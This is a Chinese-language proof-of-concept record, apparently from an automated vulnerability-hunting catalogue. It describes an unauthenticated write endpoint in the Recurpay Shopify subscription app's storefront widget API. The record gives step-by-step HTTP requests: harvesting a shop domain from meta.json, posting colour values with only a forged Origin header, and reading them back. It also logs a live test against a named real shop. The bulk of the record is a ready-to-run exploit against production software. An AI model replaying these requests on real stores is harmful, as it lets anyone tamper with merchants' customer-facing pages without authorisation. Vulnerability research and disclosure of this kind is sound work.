# Recurpay storefront widget 配置写端点 widgets/configurations 未授权写（匿名可改全店订阅 widget 配色）

- **code**: recurpay-storefront-widget-configurations-unauth-write-color
- **kind**: poc
- **category**: unauthorized
- **component**: Recurpay（Shopify 订阅 app，storefront widget API 2024-07）
- **severity**: medium
- **language**: http
- **source**: self
- **verified**: 1
- **verified_note**: worker#951，2026-11-11，本机 Linux bash + curl（ARTEX_UA）直打 api.recurpay.com。基线读端点 POST .../widgets/products/plans 返回 subscription_brand_color=#000000；随后匿名 POST .../widgets/configurations?platform=shopify&shop=gamers-delight-online.myshopify.com（仅额外带 Origin: https://gamersdelight.co.uk）返回 HTTP 200 {"success":true,"message":"Widget configurations have been updated."}；再次回读 products/plans，subscription_brand_color 实变为写入值 #0a0b0c（证明写持久生效，非空成功桩），随后 8 色回填基线并回读确认已复原。判定成立依据：读端点回显随匿名写入而变化。
- **path**: pocs/recurpay-storefront-widget-configurations-unauth-write-color/poc.http
- **created_at**: 2026-11-11T15:55:31.299Z
- **engine**: api.recurpay.com（gamersdelight.co.uk 全店订阅 widget）

## 描述

Recurpay storefront widget 的配置写端点 widgets/configurations 无鉴权：任意匿名请求（仅需一个 Origin 头指向店铺域名）即可修改该 Shop 全店订阅 widget 的 8 个颜色字段并持久生效，可篡改顾客可见的订阅按钮/品牌配色（UI 欺骗/轻量篡改）。前提：拿到目标店的 <store>.myshopify.com shop 域。

## 用法

```
前置：无需账号/Cookie/token，仅需 Origin 头=店铺站点域名；需先拿到 shop 域（从店铺首页 meta.json 或前端 JS 里取 <store>.myshopify.com）。
写端点：POST https://api.recurpay.com/storefront/api/2024-07/widgets/configurations?platform=shopify&shop=<shop>.myshopify.com
读端点（回读校验用）：POST https://api.recurpay.com/storefront/api/2024-07/widgets/products/plans?shop=<shop>.myshopify.com  body {"products":[{"id":<product_id>}]}
判据：写返回 200 success:true，且读端点回读的颜色值随之改变（这是区分"真写"与"成功桩"的关键）；仅 8 个 color 字段可写，附加 translations[...] 或任意顶层 probe 键不被存储（mass assignment 无效）。测完务必回填基线复原。
```

## 正文

```
# Recurpay storefront widget 配置未授权写（匿名改全店订阅 widget 配色）

## 组件
Recurpay（Shopify 订阅 app）storefront widget API，路径版本段 2024-07。
- 写端点: POST https://api.recurpay.com/storefront/api/2024-07/widgets/configurations
- 读端点: POST https://api.recurpay.com/storefront/api/2024-07/widgets/products/plans

## 前置条件
- 无需账号 / Cookie / token。
- 仅需一个 Origin 头，值为店铺站点域名（如 https://<storefront>）。
- 需要目标店的 shop 域 <shop>.myshopify.com：从店铺首页 /meta.json 或前端 JS 中取（meta.json 含 shop 字段）。

## 复现步骤

### 0) 取 shop 域
GET https://<storefront>/meta.json    ->  含 shop=<shop>.myshopify.com

### 1) 基线：读当前 widget 配置
POST https://api.recurpay.com/storefront/api/2024-07/widgets/products/plans?shop=<shop>.myshopify.com
Content-Type: application/json

{"products":[{"id":8996603167001}]}

-> HTTP 200
{"data":{"configurations":{"snippet_color_codes":{"subscription_brand_color":"#000000", ...}}}}
（记录 8 个颜色基线值）

### 2) 非预期写：匿名写全店 widget 配置
POST https://api.recurpay.com/storefront/api/2024-07/widgets/configurations?platform=shopify&shop=<shop>.myshopify.com
Origin: https://<storefront>
Content-Type: application/json

{"subscription_brand_color":"#0a0b0c","subscription_button_color":"#0a0b0c","subscription_button_text_color":"#ffffff","subscription_secondary_color":"#000000","cart_upsell_brand_color":"#000000","cart_upsell_button_color":"#000000","cart_upsell_button_text_color":"#ffffff","cart_upsell_secondary_color":"#000000"}

-> HTTP 200
{"success":true,"message":"Widget configurations have been updated."}

### 3) 回读确认真实生效（关键，排除成功桩）
重复步骤 1：snippet_color_codes.subscription_brand_color 变为 "#0a0b0c"（基线为 #000000）。

### 4) 复原
再次 POST 步骤 2，把 8 个颜色回填基线值，回读确认为 #000000。

## 判据
- 步骤 2 返回 200 且 success:true；
- 步骤 3 读端点回显与写入值一致 —— 说明是全店持久化配置被改，而非只回一个成功体。

## 可写字段边界（实测）
仅这 8 个颜色字段可写：
  subscription_brand_color / subscription_button_color / subscription_button_text_color / subscription_secondary_color
  cart_upsell_brand_color / cart_upsell_button_color / cart_upsell_button_text_color / cart_upsell_secondary_color
mass assignment 无效：附加 translations[premium_subscription_button_text]=X 或任意顶层 probe 键均不被存储（仍为原值）。

## 失败常见原因
- 缺 Origin 头，或 Origin 与 shop 不匹配 -> 被拒。
- shop 域写错（不是 <store>.myshopify.com）。
- 误把 products/plans 当写端点（它只读）。

## 来源
provenance: worker#951，2026-11-11，本机 Linux bash + curl（ARTEX_UA），针对 api.recurpay.com，读端点 products/plans 作回读校验。
```
